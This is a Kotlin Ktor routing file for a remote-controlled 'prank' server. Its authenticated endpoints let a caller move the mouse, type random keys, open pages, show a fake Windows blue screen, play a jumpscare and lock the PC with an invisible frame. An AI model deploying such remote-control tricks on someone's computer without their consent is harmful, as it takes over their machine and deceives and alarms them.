package it.cm.webserver.plugins

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.auth.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import it.cm.webserver.PRANK_VERSION
import it.cm.webserver.prank.*
import it.cm.webserver.request.DialogModel
import it.cm.webserver.request.NotificationModel
import it.cm.webserver.util.frameWithImage
import it.cm.webserver.util.playSong

/**
 * Configures the routing for the application.
 *
 * This method sets up the routing for different API endpoints.
 *
 * Endpoint: /version
 *    - GET: Returns the current version number.
 *
 * Endpoint: /ping
 *    - GET: Checks if the server is running.
 *
 * Endpoint: /shutdown
 *    - POST: Shuts down the server.
 *
 * Endpoint: /browse
 *    - POST: Navigates to a web page based on the received text.
 *
 * Endpoint: /popup
 *    - POST: Displays a popup based on the received DialogModel.
 *
 * Endpoint: /move_mouse
 *    - GET: Moves the mouse randomly.
 *
 * Endpoint: /jumpscare
 *    - GET: Creates a jumpscare video and audio.
 *
 * Endpoint: /fart
 *    - GET: Plays the sound of a fart.
 *
 * Endpoint: /invisible_frame
 *    - GET: Creates an invisible JFrame that renders the computer unusable for a certain period of time.
 *
 * Endpoint: /random_typer
 *    - POST: Types random keys on the keyboard for a specified time period.
 *
 * Endpoint: /screen_flip
 *    - GET: Takes a screenshot, flips it, and displays it in fullscreen to simulate a flipped display effect.
 *
 * Endpoint: /blue_screen/{time?}
 *    - GET: Displays a Windows blue screen image for a specified time period.
 *
 * Endpoint: /notification
 *    - POST: Displays a Windows notification based on the received NotificationModel.
 */
fun Application.configureRouting() {
    routing {
        authenticate("myauth1") {

            /**
             * Ritorna il numero di versione attuale
             */
            get("/version") {
                call.respond(PRANK_VERSION)
            }
            /**
             * Metodo per controllare se il server è su
             */
            get("/ping") {
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo per spegnere il server
             */
            post("/shutdown") {
                shutdownMe()
            }
            /**
             * Metodo per navigare su una pagina web
             */
            post("/browse") {
                browse(call.receiveText())
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo per mostrare un popup
             */
            post("/popup") {
                val model = call.receive<DialogModel>()
                launch { createPopup(model) }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo per muovere il mouse
             */
            get("/move_mouse") {
                launch { randomMouseMovement(5) }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che crea una jumpscare video e audio
             */
            get("/jumpscare") {
                launch { jumpscareFrame() }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che riproduce il suono di un peto
             */
            get("/fart") {
                launch { playSong("/audio/fart.wav") }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che crea una jframe invisibile rendendo il pc inutilizzabile per n secondi
             */
            get("/invisible_frame/{time?}") {
                val time: Long = call.parameters["time"]?.toLong() ?: 10000
                launch { invisibleFrame(time) }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che digita dei tasti della tastiera
             */
            post("/random_typer/{time?}") {
                val time: Long = call.parameters["time"]?.toLong() ?: 10000
                val keys: String = call.parameters["keys"] ?: "abcdefghijklmnopqrstuvwxyz"

                launch { randomTyper(time, keys) }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che fa uno screenshot e mostra questo screenshot flippato e in fullscreen
             * Facendo credere alle persone che sia il display flippato
             */
            get("/screen_flip/{time?}") {
                val time: Long = call.parameters["time"]?.toLong() ?: 10000
                launch { flipScreen(time) }
                call.respond(HttpStatusCode.OK)
            }
//            get("/pokemon") {
//                launch {
//                    with(pokemonAnimation {
//
//                    }) {
//                        delay(2000)
//                        dispose()
//                    }
//                }
//                call.respond(HttpStatusCode.OK)
//            }
            /**
             * Metodo che mostra a video un bluescreen della morte di windows
             */
            get("/blue_screen/{time?}") {
                val time: Long = call.parameters["time"]?.toLong() ?: 5000
                launch {
                    with(frameWithImage("/image/blue_screen.png")) {
                        delay(time)
                        dispose()
                    }
                }
                call.respond(HttpStatusCode.OK)
            }
            /**
             * Metodo che mostra una notification di windows
             */
            post("/notification") {
                val model = call.receive<NotificationModel>()
                launch { notification(model) }
            }
        }
    }
}